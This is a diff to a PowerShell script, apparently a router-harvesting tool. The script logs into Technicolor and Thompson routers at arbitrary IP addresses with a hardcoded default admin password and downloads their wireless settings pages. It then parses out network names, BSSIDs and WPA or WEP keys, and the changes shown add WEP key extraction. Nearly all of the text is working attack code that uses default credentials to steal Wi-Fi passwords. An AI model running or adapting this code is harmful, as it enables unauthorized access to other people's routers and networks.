@@ -94,8 +94,6 @@ Function Get-Telnet{
 function techTom($ip){
 	Write-Output "=========$ip - Technicolor - Thompson=========" 
 	curl --connect-timeout 3 -m 10 -s -u admin:Uq-4GIt3M http://$ip/ | out-null;
-	curl --connect-timeout 3 -m 10 -s -u admin:Uq-4GIt3M http://$ip/ | out-null;
-    curl --connect-timeout 3 -m 10 -s -u admin:Uq-4GIt3M -H "Authorization: Basic YWRtaW46VXEtNEdJdDNN" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "Referer: http://$ip/wlanRadio.asp" -H "Cookie: name=Session" -H "Connection: keep-alive" --compressed http://$ip/wlanPrimaryNetwork.asp | out-null;
     curl --connect-timeout 3 -m 10 -s -u admin:Uq-4GIt3M -H "Authorization: Basic YWRtaW46VXEtNEdJdDNN" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "Referer: http://$ip/wlanRadio.asp" -H "Cookie: name=Session" -H "Connection: keep-alive" --compressed http://$ip/wlanPrimaryNetwork.asp | out-null;
     curl -o $save --connect-timeout 3 -m 60 -s -u admin:Uq-4GIt3M -H "Authorization: Basic YWRtaW46VXEtNEdJdDNN" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "Referer: http://$ip/wlanRadio.asp" -H "Cookie: name=Session" -H "Connection: keep-alive" --compressed http://$ip/wlanPrimaryNetwork.asp;
 	verifyFile;
@@ -104,6 +102,12 @@ function techTom($ip){
 		try{
 			$BSSID = ($thompson -match '([0-9A-Fa-f]{2}[:]){5}[0-9A-Fa-f]{2}').split('()')[1].ToUpper()
 			$PASS = (($thompson -match ('name="WpaPreSharedKey" size="*32"* maxlength="*64"* value=".*"')) -split 'value="')[1].split('"')[0]
+			
+			#Si la contraseña está vacia es porque es WEP
+			if([string]::IsNullOrEmpty($$PASS.Trim())){
+				$PASS = (($thompson -match 'name="*NetworkKey1"* size="*26"* maxlength="*26"* value=') -split 'value=')[1].split('>')[0]
+			}
+
 			"$BSSID - $PASS"
 		}catch{
 			"Debugging error in Thompson"
@@ -210,8 +214,10 @@ function techCGA0101($ip){
     curl --connect-timeout 10 -s -m 10 -H 'Host: $ip' -H 'Origin: http://$ip' -H 'X-CSRF-TOKEN: ' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Accept: */*' -H 'X-Requested-With: XMLHttpRequest' -H 'Referer: http://$ip/' -H 'Accept-Language: es,en;q=0.9,es-419;q=0.8' -H 'Cookie: theme-value=css/theme/dark/; lang=en' --data-binary "loginUsername=admin&loginPassword=Uq-4GIt3M" --compressed http://$ip/goform/login | out-null;
 	curl -o $save --connect-timeout 10 -m 60 -s -H 'Host: $ip' -H 'Accept: */*' -H 'X-CSRF-TOKEN: ' -H 'X-Requested-With: XMLHttpRequest' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36' -H 'Referer: http://$ip/' -H 'Accept-Language: es,en;q=0.9,es-419;q=0.8' -H 'Cookie: theme-value=css/theme/dark/; lang=en' --compressed http://$ip/Wir_WirelessAPI.json;
 	verifyFile
-	$json = ((Get-Content $save | Out-String | ConvertFrom-Json).1).data
-	Write-Output $json.SSID - $json.KeyPassphrase
+	if([System.IO.File]::Exists($save)){
+		$json = ((Get-Content $save | Out-String | ConvertFrom-Json).1).data
+		Write-Output $json.SSID - $json.KeyPassphrase
+	}
 }
 
 # Technicolor DPC3928SL2 
